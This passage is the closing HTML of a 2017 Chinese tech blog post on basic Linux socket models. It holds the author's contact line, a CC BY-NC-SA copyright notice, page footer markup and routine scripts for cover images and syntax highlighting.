<p>who is sponsoring the site? - i shall say merlin (<code>wizardmerlin945@gmail.com</code>)<br>欢迎发邮件给我(生活问题，请高抬贵手)</p>

        </div>

<!-下面是评论模块 ->
        <div class="post-reply">
            
            
        </div>

		<!-- 下面是版权声明模块-->
        
<div id="copyright" class="content blockquote">
  <blockquote>
	<span><b>版权声明</b>：本文采用<b>署名(BY)</b>-<b>非商业性使用(NC)</b>-<b>相同方式共享(SA)</b>许可协议授权,转载请注明作者及出处</span><br/>
	<span><b>本文作者</b>：<a href="/" target="_blank" title="Merlin Yu">Merlin Yu</a></span><br/>
	<span><b>本文标题</b>：Linux基础套接字模型</span><br/>
	<span><b>本文链接</b>：www.merlinblog.site/2017/06/11/basic-socket-model.html</span>

  </blockquote>
</div>


    </div>
</section>

 



<script type="text/javascript">
    // 获取第一张图, 用以当封面背景图
    var img = document.querySelectorAll('img')[1]

    if (img) {
        var header_box = document.querySelector('#header_box')
        header_box.style.backgroundImage = 'url('+ img.src +')'
    }
</script>


<!-- for code block highlight --> 
<!-- theme.block_highlight -->
<!-- we do not guarantee the char sequences spell right, usr himself do it -->
<link rel="stylesheet" href="/css/highlight_rainbow.css">
<script src="/js/highlight.min.js"></script>
<script type="text/javascript"> hljs.initHighlightingOnLoad();</script>
  

<!--设置内部长度 -->                
<script type="text/javascript"> 

 $('code').attr('style', 'overflow:auto; font-size:18px; margin-left:2px; margin-right:2px;');

 
</script>






      </div>
  </div>

  <style>
  #footer {
    min-height: 10vh;
    background: black;
    color: #fff;
  }

  #footer a {
    color: #e1e1e1;
  }
</style>
<footer id="footer" class="has-text-centered is-flex center">
  <div class="container has-padding">
    <div>
      <div>
        <!--请您保留作者署名, 主题制作来之不易-->
        Copyright © <b><a href="#">Merlin Yu</a></b> 2017
        <br>
        Themed by <a href="http://haojen.github.io/">Haojen Ma</a>
		<br>
		Articles of this site licensed under <b>CC BY SA 4.0<b>
        
      </div>
    </div>
  </div>
</footer>

<script src="/js/search_core.js"></script>
<script src="/js/script.js"></script>

</body>
</html>

